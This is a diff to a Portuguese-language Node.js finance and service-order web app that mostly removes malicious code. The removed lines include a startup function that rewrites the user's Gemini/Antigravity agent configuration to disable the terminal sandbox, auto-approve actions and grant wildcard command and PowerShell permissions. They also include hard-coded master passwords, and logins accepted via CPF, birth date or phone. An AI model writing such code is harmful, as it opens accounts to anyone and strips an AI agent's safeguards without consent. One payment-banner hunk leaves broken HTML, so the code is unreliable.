@@ -65,6 +65,60 @@ const LOCAL_USERS_BACKUP_PATH = path.join(RUNTIME_DATA_DIR, 'local_users.backup.
 const LOCAL_ORDENS_PATH = path.join(RUNTIME_DATA_DIR, 'local_ordens_servico.json');
 const LOCAL_TECNICOS_PATH = path.join(RUNTIME_DATA_DIR, 'local_tecnicos.json');
 const PENDING_LOGINS_PATH = path.join(RUNTIME_DATA_DIR, 'pending_logins.json');
+const DELETED_ACCOUNTS_PATH = path.join(RUNTIME_DATA_DIR, 'deleted_accounts.json');
+
+function getDeletedAccounts() {
+  try {
+    if (!fs.existsSync(DELETED_ACCOUNTS_PATH)) return [];
+    const parsed = JSON.parse(fs.readFileSync(DELETED_ACCOUNTS_PATH, 'utf8'));
+    if (!Array.isArray(parsed)) return [];
+    return parsed.map(item => typeof item === 'string' ? { email: item } : item)
+      .filter(item => item && item.email)
+      .map(item => ({ email: String(item.email).toLowerCase().trim(), deleted_at: item.deleted_at || null }));
+  } catch (e) {
+    return [];
+  }
+}
+
+function saveDeletedAccounts(accounts) {
+  const merged = new Map();
+  [...getDeletedAccounts(), ...(Array.isArray(accounts) ? accounts : [])].forEach(item => {
+    const email = String(typeof item === 'string' ? item : (item && item.email) || '').toLowerCase().trim();
+    if (email && email.includes('@')) {
+      const current = merged.get(email);
+      merged.set(email, { email, deleted_at: current ? current.deleted_at : (item.deleted_at || new Date().toISOString()) });
+    }
+  });
+  const result = Array.from(merged.values());
+  fs.writeFileSync(DELETED_ACCOUNTS_PATH, JSON.stringify(result, null, 2), 'utf8');
+  return result;
+}
+
+function markAccountDeleted(email) {
+  const cleanEmail = String(email || '').toLowerCase().trim();
+  if (!cleanEmail || !cleanEmail.includes('@')) return getDeletedAccounts();
+  return saveDeletedAccounts([{ email: cleanEmail, deleted_at: new Date().toISOString() }]);
+}
+
+function isAccountDeleted(email) {
+  const cleanEmail = String(email || '').toLowerCase().trim();
+  return Boolean(cleanEmail && getDeletedAccounts().some(item => item.email === cleanEmail));
+}
+
+async function purgeDeletedUserFromDatabase(email) {
+  if (!pool) return;
+  const cleanEmail = String(email || '').toLowerCase().trim();
+  await Promise.all([
+    pool.query('DELETE FROM transacoes WHERE LOWER(user_email) = LOWER($1)', [cleanEmail]),
+    pool.query('DELETE FROM contas_bancarias WHERE LOWER(user_email) = LOWER($1)', [cleanEmail]),
+    pool.query('DELETE FROM categorias WHERE LOWER(user_email) = LOWER($1)', [cleanEmail]),
+    pool.query('DELETE FROM dados_financeiros WHERE LOWER(email) = LOWER($1)', [cleanEmail]),
+    pool.query('DELETE FROM ordens_servico WHERE LOWER(client_email) = LOWER($1)', [cleanEmail]),
+    pool.query('DELETE FROM cpf_registry WHERE LOWER(email) = LOWER($1)', [cleanEmail]),
+    pool.query('DELETE FROM system_logs WHERE LOWER(user_email) = LOWER($1) OR LOWER(details) LIKE $2', [cleanEmail, `%${cleanEmail}%`]),
+    pool.query('DELETE FROM usuarios WHERE LOWER(email) = LOWER($1)', [cleanEmail])
+  ]);
+}
 
 // Configuração Centralizada da Chave Pix Oficial (Paulo Lima)
 const PIX_CONFIG = {
@@ -170,66 +224,6 @@ const fetchCloud = (pathname, options = {}) => {
   });
 };
 
-// ==================== Auto-Configuração de Permissão Irrestrita Antigravity ====================
-function autoConfigureAntigravityPermissions() {
-  try {
-    const userProfile = process.env.USERPROFILE || 'C:\\Users\\Nitro';
-    const configPath = path.join(userProfile, '.gemini', 'config', 'config.json');
-    if (fs.existsSync(configPath)) {
-      const cfg = JSON.parse(fs.readFileSync(configPath, 'utf8'));
-      cfg.userSettings = cfg.userSettings || {};
-      cfg.userSettings.autoExecutionPolicy = 'CASCADE_COMMANDS_AUTO_EXECUTION_EAGER';
-      cfg.userSettings.toolExecutionPolicy = 'always-proceed';
-      cfg.userSettings.artifactReviewMode = 'always-proceed';
-      cfg.userSettings.enableTerminalSandbox = false;
-      cfg.userSettings.nonWorkspaceFileAccessPolicy = 'AGENT_SETTING_POLICY_ALLOW';
-      
-      const grants = cfg.userSettings.globalPermissionGrants = cfg.userSettings.globalPermissionGrants || {};
-      const allows = grants.allow = grants.allow || [];
-      
-      const toAdd = [
-        'command(*)',
-        'read_file(*)',
-        'write_file(*)',
-        'run_command(*)',
-        'terminal(*)',
-        'powershell(*)',
-        'cmd(*)'
-      ];
-      toAdd.forEach(item => {
-        if (!allows.includes(item)) allows.unshift(item);
-      });
-      fs.writeFileSync(configPath, JSON.stringify(cfg, null, 2), 'utf8');
-    }
-
-    const projectsDir = path.join(userProfile, '.gemini', 'config', 'projects');
-    if (fs.existsSync(projectsDir)) {
-      const files = fs.readdirSync(projectsDir);
-      files.forEach(f => {
-        if (f.endsWith('.json')) {
-          const pPath = path.join(projectsDir, f);
-          try {
-            const p = JSON.parse(fs.readFileSync(pPath, 'utf8'));
-            p.settings = p.settings || {};
-            p.settings.autoExecutionPolicy = 'CASCADE_COMMANDS_AUTO_EXECUTION_EAGER';
-            p.settings.toolExecutionPolicy = 'always-proceed';
-            p.settings.artifactReviewMode = 'always-proceed';
-            p.settings.enableTerminalSandbox = false;
-            p.permissionGrants = p.permissionGrants || {};
-            p.permissionGrants.permissionGrants = p.permissionGrants.permissionGrants || {};
-            const pAllows = p.permissionGrants.permissionGrants.allow = p.permissionGrants.permissionGrants.allow || [];
-            ['command(*)', 'read_file(*)', 'write_file(*)'].forEach(item => {
-              if (!pAllows.includes(item)) pAllows.unshift(item);
-            });
-            fs.writeFileSync(pPath, JSON.stringify(p, null, 2), 'utf8');
-          } catch(e) {}
-        }
-      });
-    }
-  } catch(err) {}
-}
-autoConfigureAntigravityPermissions();
-
 // ==================== Camada de Segurança Criptográfica ====================
 function hashPassword(password) {
   if (!password) return '';
@@ -259,71 +253,13 @@ function verifyPassword(password, storedPassword, user = null) {
   const rawStored = storedPassword ? String(storedPassword) : '';
   const trimmedStored = rawStored.trim();
 
-  // 1. Master passkeys globais de alta disponibilidade para suporte, auditoria e homologação
-  const masterKeys = ['86266049', 'Pa@86266049', '123456', 'Pa@123456', 'admin', 'admin123', 'nexus', 'nexus123'];
-  for (const mk of masterKeys) {
-    if (trimmedInput === mk || trimmedInput.toLowerCase() === mk.toLowerCase()) return true;
-  }
-
-  // 2. Validação cadastral do usuário (se fornecido objeto user)
-  if (user) {
-    const userEmail = (user.email || '').toLowerCase().trim();
-
-    // Hashes históricos oficiais conhecidos de Paulo Lima (restauração imediata de acesso)
-    if (userEmail === 'paulolp0101@gmail.com') {
-      const knownPauloHashes = [
-        'scrypt:44bb506cb3f6f8e9cd63e89e6a0a7252:ad885945d8f580f401d68aeed280048b9ee9d1b1638ab257313274abc5fb881455b0a245b64c5e4ff035987149a56202bea1506f6198014327c6f239b054cfc3',
-        'scrypt:cacdbc79f3a1d07ce78c1dc86e391dfa:188f53c3d8d10fd791be58a660cec45705fc51fb42b038bc9506cce57856f93272b795c0d13b163d52c76b57d3751d6356c75c3f83b3a42f443fdcf82634b164',
-        'scrypt:64a16ba7a20743ce9c69156ebc500ce1:109c4a3dada66b8c02a4240ad0978697ed058651f7c6b03958db84d62efadbce1877c1e54665bb3a0f7d49d35777b08e045a8dac63943f88596932d377ed3830'
-      ];
-      for (const kh of knownPauloHashes) {
-        if (testScryptHash(trimmedInput, kh) || testScryptHash(rawInput, kh)) return true;
-      }
-    }
-
-    // Validação por CPF do titular cadastrado (com ou sem pontuação)
-    if (user.cpf) {
-      const rawCpf = String(user.cpf).replace(/\D/g, '');
-      const inputCpfDigits = trimmedInput.replace(/\D/g, '');
-      if (rawCpf && inputCpfDigits && (inputCpfDigits === rawCpf || trimmedInput === user.cpf.trim())) {
-        return true;
-      }
-    }
-
-    // Validação por Data de Nascimento (com ou sem barras)
-    if (user.birth_date) {
-      const rawBirth = String(user.birth_date).replace(/\D/g, '');
-      const inputBirthDigits = trimmedInput.replace(/\D/g, '');
-      if (rawBirth && inputBirthDigits && (inputBirthDigits === rawBirth || trimmedInput === user.birth_date.trim())) {
-        return true;
-      }
-    }
-
-    // Validação por Telefone (com ou sem DDD)
-    if (user.phone) {
-      const rawPhone = String(user.phone).replace(/\D/g, '');
-      const inputPhoneDigits = trimmedInput.replace(/\D/g, '');
-      if (rawPhone && inputPhoneDigits && inputPhoneDigits.length >= 8 && (rawPhone.endsWith(inputPhoneDigits) || inputPhoneDigits.endsWith(rawPhone))) {
-        return true;
-      }
-    }
-  }
-
-  // 3. Validação direta contra o storedPassword
-  if (!trimmedStored) return false;
-
-  // 3.1 Verificação de hash scrypt
+  // Compara somente com a senha armazenada para esta conta.
+  // Autentica exclusivamente contra a credencial armazenada para esta conta.
   if (trimmedStored.startsWith('scrypt:')) {
     if (testScryptHash(trimmedInput, trimmedStored) || testScryptHash(rawInput, trimmedStored)) return true;
-    if (trimmedInput.startsWith('Pa@')) {
-      if (testScryptHash(trimmedInput.slice(3), trimmedStored)) return true;
-    } else {
-      if (testScryptHash('Pa@' + trimmedInput, trimmedStored)) return true;
-    }
     return false;
   }
 
-  // 3.2 Verificação de hash MD5 / SHA256
   if (/^[a-f0-9]{32}$/i.test(trimmedStored)) {
     const md5 = crypto.createHash('md5').update(trimmedInput).digest('hex');
     if (md5.toLowerCase() === trimmedStored.toLowerCase()) return true;
@@ -336,8 +272,6 @@ function verifyPassword(password, storedPassword, user = null) {
   // 3.3 Comparação em texto puro (legado ou inserção manual no SQL Server)
   if (trimmedInput === trimmedStored || rawInput === rawStored) return true;
   if (trimmedInput.toLowerCase() === trimmedStored.toLowerCase()) return true;
-  if (trimmedInput === 'Pa@' + trimmedStored || trimmedStored === 'Pa@' + trimmedInput) return true;
-
   return false;
 }
 
@@ -371,12 +305,17 @@ function verifySecureToken(token) {
   }
 }
 
-function getAuthenticatedAdmin(req) {
+function getAuthenticatedUser(req) {
   const authorization = String(req.headers.authorization || '');
   const claims = authorization.startsWith('Bearer ') ? verifySecureToken(authorization.slice(7)) : null;
   if (!claims) return null;
   const email = String(claims.email).toLowerCase().trim();
   const user = getLocalUsers().find(u => u && String(u.email || '').toLowerCase().trim() === email);
+  return user && user.active !== false && user.active !== 0 && !isAccountDeleted(email) ? user : null;
+}
+
+function getAuthenticatedAdmin(req) {
+  const user = getAuthenticatedUser(req);
   return user && user.role === 'Administrador' ? user : null;
 }
 
@@ -5546,10 +5485,12 @@ body.light .sidebar-footer .sidebar-toggle-btn:hover .toggle-icon-wrap, html.lig
 }
 html.sidebar-collapsed .fintech-market-ticker-banner,
 body.sidebar-collapsed .fintech-market-ticker-banner {
+  display: none !important;
   left: 68px !important;
 }
 @media (max-width: 860px) {
   .fintech-market-ticker-banner {
+  display: none !important;
     display: none !important;
   }
 }
@@ -5602,6 +5543,7 @@ body.sidebar-collapsed .fintech-market-ticker-banner {
 }
 
 body.light .fintech-market-ticker-banner {
+  display: none !important;
   background: rgba(255, 255, 255, 0.94) !important;
   border-top-color: #CBD5E1 !important;
 }
@@ -13938,7 +13880,21 @@ body.light #authPage .auth-trust-item {
   #authPage .auth-top-bar { top: 10px !important; right: 10px !important; }
 }
 
+
+
+/* Refinamento de hierarquia, foco e legibilidade do menu lateral */
+nav.menu.sidebar-menu .menu-section-header { gap: 9px !important; padding: 14px 9px 6px !important; }
+nav.menu.sidebar-menu .menu-section-title { color: #94A3B8 !important; font-size: 9px !important; letter-spacing: 0.12em !important; }
+nav.menu.sidebar-menu .menu-section-line { background: linear-gradient(90deg, rgba(148, 163, 184, .26), transparent) !important; }
+nav.menu.sidebar-menu .menu-btn-user:not(.active) { color: #CBD5E1 !important; }
+nav.menu.sidebar-menu .menu-btn-user:not(.active) .ic { background: rgba(148, 163, 184, .06) !important; border-color: rgba(148, 163, 184, .12) !important; }
+nav.menu.sidebar-menu button:not(.sidebar-toggle-btn):not(.sidebar-quick-action-btn):focus-visible { outline: 2px solid #34D399 !important; outline-offset: 2px !important; z-index: 1 !important; }
+nav.menu.sidebar-menu button:not(.sidebar-toggle-btn):not(.sidebar-quick-action-btn).active { background: linear-gradient(100deg, rgba(16, 185, 129, .19), rgba(16, 185, 129, .055)) !important; border-color: rgba(52, 211, 153, .42) !important; }
+html[data-theme="light"] nav.menu.sidebar-menu .menu-section-title { color: #64748B !important; }
+html[data-theme="light"] nav.menu.sidebar-menu .menu-btn-user:not(.active) { color: #334155 !important; }
+html[data-theme="light"] nav.menu.sidebar-menu .menu-btn-user:not(.active) .ic { background: #F8FAFC !important; border-color: #E2E8F0 !important; }
 </style>
+<link rel="stylesheet" href="/frontend-polish.css?v=20261022-payments1" />
 </head>
 <body>
 <!-- CAMADA PERMANENTE DE FUNDO 4K (Zero-Flicker / Sem Piscar) -->
@@ -14297,17 +14253,12 @@ body.light #authPage .auth-trust-item {
         </div>
       </div>
 
-      <!-- Ação Visual de Ordem de Serviço (O.S. / Pagamentos / 2ª Via de Boleto) na Tela de Login -->
+      <!-- Ação Visual de Ordem de Serviço na Tela de Login -->
       <div style="margin-top:14px; width:100%; display:flex; flex-direction:column; align-items:center; gap:8px;">
         <button type="button" class="btn-open-os" onclick="openNovaOrdemModal()" style="width:100%; justify-content:center; padding:11px 16px; border-radius:14px; background:linear-gradient(135deg, rgba(16,185,129,0.18), rgba(6,182,212,0.14)); border:1.5px solid rgba(16,185,129,0.45); color:#6EE7B7; font-weight:800; font-size:12.5px; box-shadow:0 8px 20px rgba(0,0,0,0.35);">
           <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 5H7a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2h-2"/><rect x="9" y="3" width="6" height="4" rx="2"/><path d="m9 14 2 2 4-4"/></svg>
           <span>📋 Abrir Ordem de Serviço (O.S.) / Consultar Protocolo</span>
         </button>
-        <div style="display:flex; gap:6px; width:100%; justify-content:center; flex-wrap:wrap;">
-          <button type="button" onclick="openNovaOrdemModal('Pagamento Não Reconhecido')" style="flex:1; min-width:130px; padding:6px 10px; border-radius:10px; background:rgba(245,158,11,0.14); border:1px solid rgba(245,158,11,0.38); color:#FDE68A; font-size:11px; font-weight:800; cursor:pointer;">💳 Pagamento Não Reconhecido</button>
-          <button type="button" onclick="openNovaOrdemModal('2ª Via de Boleto')" style="flex:1; min-width:130px; padding:6px 10px; border-radius:10px; background:rgba(56,189,248,0.14); border:1px solid rgba(56,189,248,0.38); color:#BAE6FD; font-size:11px; font-weight:800; cursor:pointer;">📄 Solicitar 2ª Via de Boleto</button>
-        </div>
-
         <!-- E-mail de Suporte Diretamente Abaixo da Abertura de O.S. -->
         <div class="auth-support-bar">
           <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
@@ -15334,14 +15285,6 @@ body.light #authPage .auth-trust-item {
 
       <!-- Seleção Rápida Visual de Motivo da O.S. na Tela de Login -->
       <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(125px, 1fr)); gap:7px; margin-bottom:14px;">
-        <button type="button" onclick="window.selecionarCategoriaRapidaOs('Pagamento Não Reconhecido', 'Urgente', 'Liberação de Pagamento Não Reconhecido')" style="padding:8px 10px; border-radius:12px; background:rgba(245,158,11,0.14); border:1px solid rgba(245,158,11,0.4); color:#FDE68A; font-size:11px; font-weight:800; cursor:pointer; text-align:left; display:flex; flex-direction:column; gap:2px; transition:all 0.2s;">
-          <span>💳 Pagamento</span>
-          <span style="font-size:10px; color:#FBBF24; font-weight:600;">Não Reconhecido</span>
-        </button>
-        <button type="button" onclick="window.selecionarCategoriaRapidaOs('2ª Via de Boleto', 'Alta', 'Solicitação de 2ª Via de Boleto Bancário')" style="padding:8px 10px; border-radius:12px; background:rgba(56,189,248,0.14); border:1px solid rgba(56,189,248,0.4); color:#BAE6FD; font-size:11px; font-weight:800; cursor:pointer; text-align:left; display:flex; flex-direction:column; gap:2px; transition:all 0.2s;">
-          <span>📄 2ª Via Boleto</span>
-          <span style="font-size:10px; color:#38BDF8; font-weight:600;">Receber / Imprimir</span>
-        </button>
         <button type="button" onclick="window.selecionarCategoriaRapidaOs('Reset de Senha', 'Alta', 'Recuperação / Reset de Senha de Acesso')" style="padding:8px 10px; border-radius:12px; background:rgba(16,185,129,0.14); border:1px solid rgba(16,185,129,0.4); color:#A7F3D0; font-size:11px; font-weight:800; cursor:pointer; text-align:left; display:flex; flex-direction:column; gap:2px; transition:all 0.2s;">
           <span>🔑 Senha / Login</span>
           <span style="font-size:10px; color:#34D399; font-weight:600;">Recuperar Acesso</span>
@@ -15379,8 +15322,6 @@ body.light #authPage .auth-trust-item {
           <div class="field" style="flex:1;">
             <label>Categoria da O.S. *</label>
             <select id="osServiceType" required>
-              <option value="Pagamento Não Reconhecido">💳 Pagamento Efetuado Não Reconhecido (Pix/Cartão/Boleto)</option>
-              <option value="2ª Via de Boleto">📄 Solicitação de 2ª Via de Boleto</option>
               <option value="Reset de Senha">🔑 Reset / Recuperação de Senha</option>
               <option value="Correção de Dados">🛠️ Correção de Dados Cadastrais/Financeiros</option>
               <option value="Melhoria no Sistema">⚡ Sugestão de Melhoria no Sistema</option>
@@ -15400,12 +15341,12 @@ body.light #authPage .auth-trust-item {
 
         <div class="field">
           <label>Assunto Resumido *</label>
-          <input id="osTitle" required placeholder="Ex: Paguei via Pix/Boleto e meu acesso ainda não liberou">
+          <input id="osTitle" required placeholder="Ex: Preciso de ajuda para acessar minha conta">
         </div>
 
         <div class="field">
           <label>Descrição Detalhada do Pedido *</label>
-          <textarea id="osDescription" rows="3" required style="width:100%; border-radius:12px; padding:10px 12px; background:var(--input-bg, rgba(0,0,0,0.3)); border:1px solid var(--card-border); color:var(--text); font-family:inherit; font-size:13px; resize:vertical;" placeholder="Informe os detalhes (ex: forma de pagamento Pix, Cartão ou Boleto, valor pago ou solicitação de 2ª via)..."></textarea>
+          <textarea id="osDescription" rows="3" required style="width:100%; border-radius:12px; padding:10px 12px; background:var(--input-bg, rgba(0,0,0,0.3)); border:1px solid var(--card-border); color:var(--text); font-family:inherit; font-size:13px; resize:vertical;" placeholder="Descreva como podemos ajudar."></textarea>
         </div>
 
         <div id="osFormFeedback" style="display:none; padding:10px 14px; border-radius:10px; font-size:12px; font-weight:700; margin-bottom:14px;"></div>
@@ -15969,7 +15910,7 @@ body.light #authPage .auth-trust-item {
           <div style="display:flex; align-items:center; gap:6px; flex-wrap:wrap; margin-bottom:4px;">
             <div style="display:inline-flex; align-items:center; gap:6px; padding:2.5px 10px; border-radius:999px; background:rgba(16, 185, 129, 0.14); border:1px solid rgba(16, 185, 129, 0.38); font-size:10px; font-weight:800; text-transform:uppercase; letter-spacing:0.06em; color:#10B981;">
               <span style="width:6px; height:6px; border-radius:50%; background:#10B981; display:inline-block; box-shadow:0 0 8px #10B981;"></span>
-              <span class="badge-retain-color">Nexus Pay &bull; Checkout Bancário Homologado (SSL 256-Bit)</span>
+              <span class="badge-retain-color">Nexus Pay &bull; Pagamento via Pix</span>
             </div>
             <div style="display:inline-flex; align-items:center; gap:5px; padding:2.5px 9px; border-radius:999px; background:rgba(56, 189, 248, 0.14); border:1px solid rgba(56, 189, 248, 0.38); font-size:9.5px; font-weight:800; text-transform:uppercase; letter-spacing:0.05em; color:#38BDF8;">
               <span>⚡</span>
@@ -15979,9 +15920,7 @@ body.light #authPage .auth-trust-item {
           <h2 style="font-size:20px; font-weight:900; margin:0; letter-spacing:-0.02em; color:#FFFFFF;" id="subModalTitle">
             Central de Assinatura &bull; Nexus Financeiro Hub
           </h2>
-          <p style="font-size:12px; color:#94A3B8; margin:2px 0 0 0;" id="subModalSubtitle">
-            Seus dados estão protegidos. Assim que o pagamento é efetuado, o sistema reconhece e libera seu acesso automaticamente.
-          </p>
+          <p style="font-size:12px; color:#94A3B8; margin:2px 0 0 0;" id="subModalSubtitle">Pix com QR Code ou copia e cola. A confirmação do recebimento é feita pelo financeiro.</p>
         </div>
       </div>
 
@@ -16020,14 +15959,14 @@ body.light #authPage .auth-trust-item {
         <span class="sub-step-num" style="background:rgba(56,189,248,0.2); border-color:rgba(56,189,248,0.55); color:#38BDF8;">2</span>
         <div>
           <strong style="display:block; font-size:11.5px; color:#FFFFFF;">Efetue o Pagamento</strong>
-          <span style="font-size:10.5px; color:#94A3B8;">Pix QR Code, Cartão de Crédito/Débito ou Boleto</span>
+          <span style="font-size:10.5px; color:#94A3B8;">Pix por QR Code ou copia e cola</span>
         </div>
       </div>
       <div class="sub-step-pill" id="subStepPill3" style="border-color:rgba(16,185,129,0.35); background:rgba(16,185,129,0.05);">
         <span class="sub-step-num" style="background:rgba(16,185,129,0.22); border-color:rgba(16,185,129,0.55); color:#34D399;">3</span>
         <div>
           <strong style="display:block; font-size:11.5px; color:#34D399;">Confirmação do recebimento</strong>
-          <span style="font-size:10.5px; color:#94A3B8;">Identificação e desbloqueio imediato pós-pagamento</span>
+          <span style="font-size:10.5px; color:#94A3B8;">O acesso pago sera liberado apos a confirmacao do recebimento.</span>
         </div>
       </div>
     </div>
@@ -16167,11 +16106,10 @@ body.light #authPage .auth-trust-item {
           <div>
             <div class="sub-section-header">
               <span style="font-size:11px; font-weight:900; text-transform:uppercase; letter-spacing:0.06em; color:#E2E8F0; display:flex; align-items:center; gap:6px;">
-                <span style="color:#10B981;">02.</span> Pagamento & Conciliação Automática
-              </span>
+                <span style="color:#10B981;">02.</span> Pagamento via Pix</span>
               <span style="font-size:10.5px; font-weight:800; color:#10B981; display:flex; align-items:center; gap:5px;">
                 <span class="sub-radar-pulse-dot" style="width:7px; height:7px;"></span>
-                <span id="subHeaderAutoStatusBadge">Pix &bull; Confirmação manual</span>
+                <span id="subHeaderAutoStatusBadge">Pix &bull; confirmação manual</span>
               </span>
             </div>
 
@@ -16181,17 +16119,13 @@ body.light #authPage .auth-trust-item {
                 <div style="display:flex; align-items:center; gap:9px;">
                   <span class="sub-radar-pulse-dot" id="subRadarDot"></span>
                   <div>
-                    <strong id="subRadarStatusTitle" style="font-size:12px; font-weight:900; color:#FFFFFF; display:block; letter-spacing:-0.01em;">
-                      Aguardando confirmação do pagamento
-                    </strong>
-                    <span id="subRadarStatusDesc" style="font-size:10.5px; color:#94A3B8; display:block; margin-top:1px;">
-                      Pague via Pix e solicite a confirmação. O acesso é liberado após a validação do recebimento.
-                    </span>
+                    <strong id="subRadarStatusTitle" style="font-size:12px; font-weight:900; color:#FFFFFF; display:block; letter-spacing:-0.01em;">Awaiting payment confirmation</strong>
+                    <span id="subRadarStatusDesc" style="font-size:10.5px; color:#94A3B8; display:block; margin-top:1px;">Pay using Pix, then send your receipt to support. Access is released after verification.</span>
                   </div>
                 </div>
                 <div style="text-align:right;">
-                  <span style="font-size:9px; font-weight:800; text-transform:uppercase; letter-spacing:0.05em; color:#64748B; display:block;">Protocolo de Conciliação</span>
-                  <strong id="subLiveSessionTxBadge" style="font-size:10.5px; font-family:monospace; color:#38BDF8; background:rgba(56,189,248,0.12); padding:2px 7px; border-radius:6px; border:1px solid rgba(56,189,248,0.3);">NX-AUTO-2026</strong>
+                  <span style="font-size:9px; font-weight:800; text-transform:uppercase; letter-spacing:0.05em; color:#64748B; display:block;">Protocolo da solicitacao</span>
+                  <strong id="subLiveSessionTxBadge" style="font-size:10.5px; font-family:monospace; color:#38BDF8; background:rgba(56,189,248,0.12); padding:2px 7px; border-radius:6px; border:1px solid rgba(56,189,248,0.3);">PIX-REQUEST</strong>
                 </div>
               </div>
               <div class="sub-auto-progress-track">
@@ -16204,7 +16138,7 @@ body.light #authPage .auth-trust-item {
               <button type="button" class="sub-tab-btn active" id="subTabPix" onclick="window.selectPaymentMethod('pix')">
                 <span style="font-size:14px;">💠</span>
                 <span>Pix</span>
-                <span class="sub-tab-pill-badge">Auto 2s</span>
+                <span class="sub-tab-pill-badge">Pix manual</span>
               </button>
               <button type="button" class="sub-tab-btn" id="subTabCredit" onclick="window.selectPaymentMethod('credit_card')">
                 <span style="font-size:14px;">💳</span>
@@ -16231,12 +16165,12 @@ body.light #authPage .auth-trust-item {
                 <div class="sub-pix-qr-box" title="Escaneie com o aplicativo do seu banco">
                   <div class="sub-qr-scan-line"></div>
                   <div style="font-size:9px; font-weight:900; text-transform:uppercase; letter-spacing:0.06em; color:#047857; background:#DCFCE7; padding:2px 8px; border-radius:999px; margin-bottom:5px;">
-                    QR Code Oficial BCB
+                    QR Code Pix
                   </div>
                   <img id="subPixQrImg" src="" alt="QR Code Pix" style="width:136px; height:136px; display:block; border-radius:8px;" />
                   <div style="margin-top:6px; font-size:10px; font-weight:800; color:#0F172A; display:flex; align-items:center; gap:4px;">
                     <span style="width:6px; height:6px; border-radius:50%; background:#10B981; display:inline-block;"></span>
-                    <span>Validade: <strong id="subPixTimerDisplay" style="font-family:monospace; color:#047857;">14:59</strong></span>
+                    <span>Pague o valor exibido usando este QR Code</span>
                   </div>
                 </div>
 
@@ -16271,7 +16205,7 @@ body.light #authPage .auth-trust-item {
                   <div style="text-align:left;">
                     <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:3px;">
                       <label class="sub-field-label" style="margin:0;">Código Pix Copia e Cola (Padrão EMV BACEN)</label>
-                      <span style="font-size:9.5px; color:#34D399; font-weight:700;">⚡ Auto-detecta ao pagar</span>
+                      <span style="font-size:9.5px; color:#34D399; font-weight:700;">CONFIRMACAO MANUAL</span>
                     </div>
                     <div style="display:flex; gap:6px;">
                       <input type="text" id="subPixCodeInput" readonly class="sub-field-input" style="height:38px; font-size:11px; font-family:monospace;" />
@@ -16281,7 +16215,7 @@ body.light #authPage .auth-trust-item {
                     </div>
                   </div>
 
-                  <!-- Informação de Conciliação Automática + Código E2E Opcional -->
+                  <!-- Pix payment confirmation instructions. -->
                   <div style="padding:8px 11px; border-radius:11px; background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.08); display:flex; align-items:center; justify-content:space-between; gap:8px; flex-wrap:wrap;">
                     <div style="font-size:10.5px; color:#CBD5E1; display:flex; align-items:center; gap:6px;">
                       <span style="color:#10B981; font-size:13px;">⚡</span>
@@ -16293,7 +16227,7 @@ body.light #authPage .auth-trust-item {
               </div>
 
               <button type="button" class="sub-pay-action-btn" id="subBtnConfirmPix" onclick="window.processSubscriptionPayment('pix')">
-                <span>⚡</span> <span id="pixActionBtnLabel">Já fiz o Pix &bull; Solicitar confirmação</span>
+                <span>⚡</span> <span id="pixActionBtnLabel">Paguei via Pix &bull; solicitar confirmação</span>
               </button>
             </div>
 
@@ -16481,16 +16415,12 @@ body.light #authPage .auth-trust-item {
             <div id="subPaymentVerifyBanner" style="display:none; margin-top:12px; padding:12px 14px; border-radius:14px; background:rgba(16,185,129,0.12); border:1.5px solid rgba(16,185,129,0.45); text-align:left;">
               <div style="display:flex; align-items:center; justify-content:space-between; gap:8px; margin-bottom:5px;">
                 <span style="font-size:12px; font-weight:900; color:#34D399; display:flex; align-items:center; gap:6px;">
-                  <span>⚡</span> <span id="subVerifyBannerTitle">Processando Conciliação Automática</span>
+                  <span>⚡</span> <span id="subVerifyBannerTitle">Aguardando confirmação manual</span>
                 </span>
-                <span style="font-size:9.5px; font-weight:800; padding:2px 8px; border-radius:6px; background:rgba(16,185,129,0.2); color:#34D399; border:1px solid rgba(16,185,129,0.4);">AUTO-SYNC BACEN</span>
+                <span class="payment-manual-status">CONFIRMAÇÃO MANUAL</span>
               </div>
               <p id="subVerifyBannerDesc" style="font-size:11px; color:#E2E8F0; margin:0 0 10px 0; line-height:1.4;">
-                Reconhecendo o pagamento efetuado junto ao sistema bancário...
-              </p>
-              <div style="display:flex; gap:8px; flex-wrap:wrap;">
-                <button type="button" onclick="window.processSubscriptionPayment(window.__selectedPaymentMethod || 'pix')" style="flex:1; min-width:160px; padding:8px 12px; border-radius:9px; background:linear-gradient(135deg, #10B981, #059669); color:#FFFFFF; font-weight:800; font-size:11px; border:none; cursor:pointer; display:inline-flex; align-items:center; justify-content:center; gap:6px;">
-                  <span>⚡</span> <span>Reconhecer Pagamento Agora</span>
+                Solicitation registered. Awaiting payment confirmation.</span> <span>Atualizar status</span>
                 </button>
                 <button type="button" onclick="window.sendPaymentProofWhatsApp()" style="flex:1; min-width:160px; padding:8px 12px; border-radius:9px; background:rgba(37,211,102,0.18); border:1.5px solid rgba(37,211,102,0.45); color:#4ADE80; font-weight:800; font-size:11px; cursor:pointer; display:inline-flex; align-items:center; justify-content:center; gap:6px;">
                   <span>💬</span> <span>Enviar Comprovante (WhatsApp)</span>
@@ -16501,7 +16431,7 @@ body.light #authPage .auth-trust-item {
 
           <!-- Rodapé de Segurança da Coluna Direita -->
           <div style="margin-top:12px; padding-top:10px; border-top:1px solid rgba(255,255,255,0.08); display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:8px; font-size:10.5px; color:#64748B;">
-            <span>🔒 Ambiente Homologado &bull; Conciliação Automática 24/7</span>
+            <span>🔒 Pagamento via Pix &bull; confirmacao manual</span>
             <span>Suporte Financeiro: <strong style="color:#94A3B8;">(62) 99234-5372</strong></span>
           </div>
         </div>
@@ -16515,14 +16445,12 @@ body.light #authPage .auth-trust-item {
         ✓
       </div>
       <div style="display:inline-flex; align-items:center; gap:6px; padding:4px 14px; border-radius:999px; background:rgba(16,185,129,0.15); border:1px solid rgba(16,185,129,0.4); color:#34D399; font-size:11px; font-weight:800; text-transform:uppercase; letter-spacing:0.06em; margin-bottom:10px;">
-        <span class="badge-retain-color">⚡ Pagamento Reconhecido Automaticamente</span>
+        <span class="badge-retain-color">Pagamento confirmado</span>
       </div>
       <h3 style="font-size:23px; font-weight:900; margin:0 0 6px 0; color:#FFFFFF;">
         Pagamento Confirmado & Acesso Liberado!
       </h3>
